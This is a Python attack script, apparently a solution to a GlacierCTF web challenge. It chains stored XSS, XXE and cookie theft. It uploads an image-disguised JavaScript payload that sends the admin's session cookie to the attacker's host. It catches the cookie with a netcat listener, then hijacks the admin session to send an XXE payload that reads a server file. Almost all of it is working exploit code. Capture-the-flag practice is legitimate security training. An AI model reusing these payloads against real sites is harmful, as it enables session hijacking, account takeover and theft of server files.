import requests
import os

username = "kaiziron"
password = "kaiziron"
ourHost = "REDACTED"
ourPort = "1337"
fileToGet = "/flag.txt"

print('listen on port 1337')

session = requests.session()

burp0_url = "https://peak.web.glacierctf.com:443/actions/register.php"
burp0_data = {"username": username, "password": password, "button": ''}
print('register...')
res = session.post(burp0_url, data=burp0_data)
#print(res.text)
print(session.cookies)

burp0_url = "https://peak.web.glacierctf.com:443/actions/login.php"
burp0_data = {"username": username, "password": password, "button": ''}
print('login...')
res = session.post(burp0_url, data=burp0_data)
#print(res.text)

filename = "foobar"

burp0_url = "https://peak.web.glacierctf.com:443/actions/contact.php"
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://peak.web.glacierctf.com", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryo56bh9CgeF9u8BhV", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://peak.web.glacierctf.com/pages/contact.php", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
burp0_data = f"------WebKitFormBoundaryo56bh9CgeF9u8BhV\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\ntitle\r\n------WebKitFormBoundaryo56bh9CgeF9u8BhV\r\nContent-Disposition: form-data; name=\"content\"\r\n\r\nmessage <script src=\"/uploads/{filename}\"></script>\r\n------WebKitFormBoundaryo56bh9CgeF9u8BhV\r\nContent-Disposition: form-data; name=\"image\"; filename=\"xssPayload.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nGIF89a=0;document.location='http://{ourHost}:{ourPort}/?c='+document.cookie;\r\n------WebKitFormBoundaryo56bh9CgeF9u8BhV--\r\n"
print('uploading xss payload...')
res = session.post(burp0_url, headers=burp0_headers, data=burp0_data)

msgId = res.text.split('/pages/view_message.php?id=')[1].split("'")[0]
print('msgId :', msgId)

burp0_url = "https://peak.web.glacierctf.com:443/pages/view_message.php?id=" + msgId
res = session.post(burp0_url)
filename = res.text.split('<img name="image" src="/uploads/')[1].split('"')[0]
print('filename :', filename)
print('https://peak.web.glacierctf.com:443/uploads/' + filename)


burp0_url = "https://peak.web.glacierctf.com:443/actions/contact.php"
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://peak.web.glacierctf.com", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryo56bh9CgeF9u8BhV", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://peak.web.glacierctf.com/pages/contact.php", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
burp0_data = f"------WebKitFormBoundaryo56bh9CgeF9u8BhV\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\ntitle\r\n------WebKitFormBoundaryo56bh9CgeF9u8BhV\r\nContent-Disposition: form-data; name=\"content\"\r\n\r\nmessage <script src=\"/uploads/{filename}\"></script>\r\n------WebKitFormBoundaryo56bh9CgeF9u8BhV\r\nContent-Disposition: form-data; name=\"image\"; filename=\"xssPayload.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nGIF89a=0;document.location='http://{ourHost}:{ourPort}/?c='+document.cookie;\r\n------WebKitFormBoundaryo56bh9CgeF9u8BhV--\r\n"
print('xss...')
res = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
msgId = res.text.split('/pages/view_message.php?id=')[1].split("'")[0]
print('msgId :', msgId)
print("https://peak.web.glacierctf.com:443/pages/view_message.php?id=" + msgId)
print('\nwait for admin to view it')

response = os.popen(f"nc -nlvp {ourPort}").read()
print(response)

adminCookie = response.split('GET /?c=PHPSESSID=')[1].split(' HTTP')[0]
print('admin cookie :', adminCookie)

print('\nxxe to get flag as admin...')

session = requests.session()

burp0_url = "https://peak.web.glacierctf.com:443/admin/map.php"
burp0_cookies = {"PHPSESSID": adminCookie}
burp0_data = {"data": f"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n  <!DOCTYPE lat [  \r\n  <!ELEMENT lat ANY >\r\n  <!ENTITY xxe SYSTEM \"file://{fileToGet}\" >]>\r\n<markers>\r\n    <marker>\r\n        <lat>&xxe;</lat>\r\n        <lon>12.695247219</lon>\r\n        <name>Gro\xc3\x9fglockner</name>\r\n    </marker>\r\n</markers>"}
res = session.post(burp0_url, cookies=burp0_cookies, data=burp0_data)
fileContent = res.text.split('L.marker(["')[1].split('"')[0]
print(fileToGet + " : " + fileContent)

